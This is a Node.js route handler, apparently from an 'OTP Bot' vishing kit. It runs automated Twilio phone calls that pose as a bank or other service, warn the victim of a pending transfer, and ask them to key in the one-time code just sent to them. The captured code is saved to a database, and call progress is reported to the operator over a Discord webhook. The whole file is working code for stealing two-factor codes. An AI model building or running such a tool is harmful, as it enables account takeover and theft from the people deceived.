module.exports = function(request, response) {
    /**
     * Fichier contenant les configurations nécéssaires au bon fonctionnement du système
     */
    const config = require('.././config');


    const {
        Webhook,
        MessageBuilder
    } = require('discord-webhook-node');
    const hook = new Webhook(config.discordwebhook || '');

    /**
     * Intégration des dépendences SQLITE3
     */
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database('./db/data.db');

    /**
     * Récupération des variables postées permettant d'ordonner la réponse API en TwiML
     */
    var input = request.body.RecordingUrl || request.body.Digits || "0";
    var callSid = request.body.CallSid;

    if (!!!callSid) {
        return response.status(200).json({
            error: 'Please give us the callSid.'
        });
    }

    /**
     * On récupère le Service utilisé dans cet appel pour ensuite retourner le bon audio à utiliser
     */
    db.get('SELECT service, name, otplength FROM calls WHERE callSid = ?', [callSid], (err, row) => {
        if (err) {
            return console.log(err.message);
        }

        /**
         * Au cas où le callSid n'est pas trouvé, on utilise l'audio par défaut
         * Pareil pour le nom de la personne à appeler,
         * Pareil pour l'otp length
         */
		var service = row.service == null ? 'default' : row.service;
        var name = row.name == null ? '' : row.name;
        var otplength = row.otplength == null ? '5' : row.otplength;
		
        var service = row.service == null ? 'default' : row.service;
        var name = row.name == null ? '' : row.name;
        var otplength = row.otplength == null ? '6' : row.otplength;

        /**
         * L'on crée ici les url des audios grâce aux données dans le fichier config
         */
        var endurl = config.serverurl + '/stream/end';
        var askurl = config.serverurl + '/stream/' + service;
        var numdigits = otplength;
		

        /**
         * Ici l'on crée la réponse TwiML à renvoyer, en y ajoutant l'url de l'audio
         */
        var end = '<?xml version="1.0" encoding="UTF-8"?><Response><Say voice="Polly.Joanna">Your account is now secured. Thank You!</Say></Response>';
        var ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="15" numDigits="' + numdigits + '"><Pause length="2"/><Say voice="Polly.Joanna"><prosody rate="slow">For security reasons we have to verify You are the real owner of this account in order to block this request. Please dial the ' + numdigits + ' digit code we just sent you.</prosody></Say></Gather></Response>';

        var otpsend = `<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="1"><Pause length="4"/><Say voice="Polly.Joanna"><prosody rate="slow">Hello ${row.name}, Welcome to ${row.service} We have recently received a request to process a transfer scheduled  on your account.If this was not you please press 1, If this was you please press 2.</prosody></Say></Gather></Response>`;
        var otpSendEnd = end;

        /**
         * Si l'utilisateur à envoyé le code, alors l'ajouter à la base de donnée et renvoyer l'audio de fin : fin de l'appel
         */
        length = service == 'banque' ? 8 : otplength;
        db.get('SELECT * FROM calls WHERE callSid = ?', [request.body.CallSid], (err, row) => {
            if (err) {
                return console.log(err.message);
            }

            if(row.otpsend == 0 && input.match(/^[1-2]$/) == null) {
                respond(otpsend);
            } else if(row.otpsend == 0 && input.match(/^[1-2]$/) != null) {
                if(input == 1) {
                    db.run(`UPDATE calls SET otpsend = 1 WHERE callSid = ?`, [request.body.CallSid], function(err) {
                        if (err) {
                            return console.log(err.message);
                        }
                    });

                    embed = new MessageBuilder()
                        .setTitle(`OTP Bot`)
                        .setColor('15158332')
                        .setDescription('Status: **Send OTP**')
                        .setFooter(row.user)
                        .setTimestamp();
                    hook.send(embed);

                    respond(ask);
                } else {
                    embed = new MessageBuilder()
                        .setTitle(`:mobile_phone: ${row.itsto}`)
                        .setColor('15158332')
                        .setDescription('Status: **User pressed 2 (Exit)**')
                        .setFooter(row.user)
                        .setTimestamp();
                    hook.send(embed);
                    respond(otpSendEnd);
                }
            } else {
                if(input.length == length && input.match(/^[0-9]+$/) != null && input != null) {
                    /**
                     * Audio de fin
                     */
                    respond(end);
                    /**
                     * Ajout du code en DB
                     */
                    db.run(`UPDATE calls SET digits = ? WHERE callSid = ?`, [input, request.body.CallSid], function(err) {
                        if (err) {
                            return console.log(err.message);
                        }
                    });
                } else {
                    /**
                     * L'on retourne le TwiML de base pour rejouer l'audio
                     */
                    respond(ask);
                }
            }
        });
    });

    function respond(text) {
        response.type('text/xml');
        response.send(text);
    }
};